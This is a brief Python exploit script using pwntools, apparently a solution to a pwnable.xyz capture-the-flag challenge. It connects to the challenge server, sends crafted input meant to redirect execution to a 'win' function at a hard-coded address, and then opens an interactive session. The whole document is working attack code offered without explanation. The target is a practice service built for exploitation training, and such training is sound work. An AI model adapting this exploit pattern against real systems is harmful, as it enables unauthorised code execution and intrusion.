from pwn import *



###Addr
win = 0x400822

###Exploit
r = remote('svc.pwnable.xyz',30002)

r.sendlineafter('Input: ',str(win)+' '+str(0)+' '+str(13))
r.sendlineafter('Input: ','M30W')

r.interactive()
